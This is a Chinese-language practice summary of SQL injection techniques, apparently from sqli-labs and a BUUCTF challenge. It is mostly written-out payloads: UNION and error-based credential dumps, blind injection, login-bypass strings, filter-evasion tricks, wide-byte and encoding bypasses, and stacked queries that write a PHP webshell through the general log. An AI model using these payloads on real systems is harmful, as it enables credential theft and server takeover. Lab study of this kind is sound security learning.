---
title: "SQL 注入练习总结"
date: 2025-05-30
tags:
  - 基础漏洞练习总结
categories:
  - 安全相关
---
## 基本方式

### 初步判断

```payload
# 判断闭合方式
?id=1'--+
```

```payload
# 判断字段数
?id=1' order by 3--+
?id=1' order by 4--+
```

```payload
# 查询有可注入的字段
?id=-1' union select 1,2,3 --+
```

查表、查列、查字段……

### 联合查询注入

```payload
?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+	# 注释后面的语句

?id=-1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and '1'='1	# 闭合后面的语句
```

### 报错注入

```payload
?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
```

#### 【解释】

```payload
?id=1' and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,password) as char), 0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
# cast x as char	将x转换为字符串
# select 1 from (...) a	子查询的别名是a
# select count(*), concat(...)x from information_schema.tables group by x	对子查询concat的结果x进行聚合，count(*)仅作为配合group by的子句，无具体含义
```

- 在这个查询中，`count(*)` 是聚合函数，而 `x` 是非聚合列。根据 `ONLY_FULL_GROUP_BY` 规则，`x` 应该出现在 `GROUP BY` 子句中。
- 然而，即使 `x` 出现在 `GROUP BY` 子句中，由于 `x` 的值不是唯一的（因为 `floor(rand(0)*2)` 固定为 0 或 1），MySQL 仍然会尝试对这些重复的键进行分组，从而引发错误。

```payload
?id=1'+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1--+
```

```none
updatexml(1,concat(0x7e,(select database()),0x7e),1)
extractvalue(1,concat(0x7e,database()))
```

### 布尔盲注

```payload
?id=1' and left(database(),1)>'r'--+
?id=1' and left(database(),1)>'s'--+
```

### 延时盲注

```payload
?id=1' and if(ascii(substr(database(),1,1))>114,1,sleep(5))--+
?id=1' and if(ascii(substr(database(),1,1))>115,1,sleep(5))--+
```

### 文件操作

（需注入配置文件中 secure_file_priv 的值）

```Payload
/?id=1'))+UNION+SELECT 1,2,"<?php phpinfo();?>" INTO OUTFILE "/var/www/html/Less-7/info.php"--+ 
```

### 万能密码

```payload
# 注释掉 passwd 来登录
uname=admin'--+&passwd=&submit=Submit
uname=admin'#&passwd=&submit=Submit

# 注释后面语句 并 添加一个永真条件
uname=admin&passwd=1' or 1--+&submit=Submit
uname=admin&passwd=1'||1--+&submit=Submit
uname=admin&passwd=1' or 1#&submit=Submit
uname=admin&passwd=1'||1#&submit=Submit

# 闭合后面语句 并 添加一个永真条件
uname=admin&passwd=1'or'1'='1&submit=Submit
uname=admin&passwd=1'||'1'='1&submit=Submit
```

### 双写/大小写

```payload
unioN
unIon
seLect

uunionnion
sselectelect
ununionion
passwoorrd
```

### 空格绕过

| 符号  |     说明     |
| :-: | :--------: |
| %09 | TAB 键 (水平) |
| %0a |    新建一行    |
| %0c |    新的一页    |
| %0d | return 功能  |
| %0b | TAB 键 (垂直) |
| %a0 |     空格     |

### 解析问题绕过

```php
# 原本只有id一个参数，但是在传参时传入两个参数，来绕过过滤，在第二个参数后进行注入
login.php?id=1&id=2
login.php?id=1&id=-2' union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+
```

- Apache PHP 会解析最后一个参数；

- Tomcat JSP 会解析第一个参数

### 宽字节注入

GBK 编码和存在反斜杠过滤的情况下

```payload
?id=-1%df' union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+
```

### 编码绕过

将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`

```bash
# 将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`
➜  ~ echo \'|iconv -f utf-8 -t utf-16
��'
➜  ~ echo \'|iconv -f utf-8 -t utf-32
��'
```

```payload
uname=�' or 1#&passwd=
```

```sql
SELECT username, password FROM users WHERE username='�' or 1#and password='$passwd' LIMIT 0,1
```

```payload
uname=�' and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&passwd=
```

### 堆叠注入

```payload
# 开启日志记录功能并指定日志目录
?id=1';set global general_log = "ON";set global general_log_file='/var/www/html/shell.php';--+
```

```sql
?id=1';select <?php phpinfo();?>
```

查询木马写入日志文件，Getshell~

## 其余及题例

### 题例：BUUCTF [BJDCTF 2020]Easy MD5

PHP 函数，`md5(string, raw)`

- `string` 必需。要计算的字符串。
- `raw` 可选。规定十六进制或二进制输出格式：
	- TRUE 返回 16 位原始二进制格式的字符串。
	- FALSE （默认） 32 位 16 进制的字符串。

```sql
select * from 'admin' where password=md5($pass,true)

ffifdyop 	# 利用该字符串可绕过
md5值为： 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
另：129581926211651571912466741651878684928 
md5值为： \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8 
```
